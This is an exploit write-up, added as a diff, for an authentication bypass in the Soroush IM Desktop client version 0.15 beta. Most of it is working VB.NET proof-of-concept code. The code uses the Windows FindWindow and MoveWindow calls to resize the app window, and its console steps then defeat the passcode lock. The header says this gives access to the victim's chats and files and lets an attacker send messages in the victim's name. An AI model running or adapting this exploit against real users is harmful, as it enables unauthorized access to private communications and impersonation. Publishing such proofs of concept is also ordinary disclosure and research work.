@@ -1,0 +1,65 @@
+# Exploit Title: Soroush IM Desktop app 0.15 - Authentication Bypass
+# Date: 2018-06-13
+# Exploit Author: VortexNeoX64
+# Vendor Homepage: https://soroush-app.ir
+# Software Link: https://soroush-app.ir/UploadedData/Soroush.exe
+# Version: 0.15 BETA
+# Tested on: Windows 10 1803
+
+# Security Issue:
+# Attackers can unlock the client app installed on Windows OS(others?) without the passcode
+# and access to all the files, chats, images, and etc.
+# the attacker can then send, receive message of any kind on the behalf of the authorized user.
+
+# PoC (.NET 4.0 Visual Basic)
+
+''make sure before running this exploit the Soroush Messager window is NOT  minimized
+''adding  InteropServices for DLLImport
+Imports System.Runtime.InteropServices    
+Module Module1
+    
+''FindWindow API from user32.dll to get the window handler by lpWindowName 
+    <DllImport("user32.dll", SetLastError:=True)>
+    Private Function FindWindow(lpClassName As String, lpWindowName As String) As IntPtr
+    End Function
+''MoveWindow API from user32.dll to move and resize the window to trigger the bypass process
+    <DllImport("user32.dll", SetLastError:=True)> Private Function MoveWindow(hWnd As IntPtr, X As Integer, Y As Integer,
+    nWidth As Integer, nHeight As Integer, bRepaint As Boolean) As Boolean
+    End Function
+    Sub Main()
+        Try
+            Console.WriteLine("<<<<<Soroush IM Desktop GUI misbehaviour leads to passcode bypass>>>>> ")
+            Console.WriteLine("****** Developer: NeoVortex")
+            Console.WriteLine("****** Client Version 0.15 BETA")
+            Console.WriteLine("****** Tested on windows 10 1803")
+            Console.WriteLine("[****] Make sure the Messager windows is not minimized ")
+            Console.WriteLine("[Press any key to start the exploit...]")
+            Console.ReadKey()
+            Dim pss() As Process = Process.GetProcessesByName("Soroush")
+            Dim hWnd As IntPtr = FindWindow(Nothing, "Soroush")
+'' check if the app is running
+            If (pss.Count > 0) Then
+                Console.WriteLine("[****] Process found with id: " & pss(0).Id)
+                Console.WriteLine("[****] Process File " & pss(0).MainModule.FileName)
+                Console.WriteLine("[****] Resizing to trigger the vulnerability.....")
+'' move and resize the window 
+                MoveWindow(hWnd, 100, 100, 100, 100, True)
+                Console.WriteLine("[****] Done")
+                Console.WriteLine("[****] Now close the Soroush messager windows via X button (NOT via system tray) , then reopen it ")
+                Console.WriteLine("[****] Passcode will be bypassed! ")
+'' now you should close the exploit window and then close the Soroush messager window manually via X button(NOT FROM SYSTEM TRAY) because the Soroush messager window dose not support WM_CLOSE signal for the single window closing
+''if anyone could close the GUI window without accually killing the app, he/she is welcome at gitub link below.
+            Else
+''app is not ruuning
+                Console.WriteLine("[----]Process not found ")
+            End If
+            Console.ReadKey()
+
+        Catch ex As Exception
+            Beep()
+            MsgBox(ex.Message, 16)
+            Console.ReadKey()
+        End Try
+    End Sub
+
+End Module
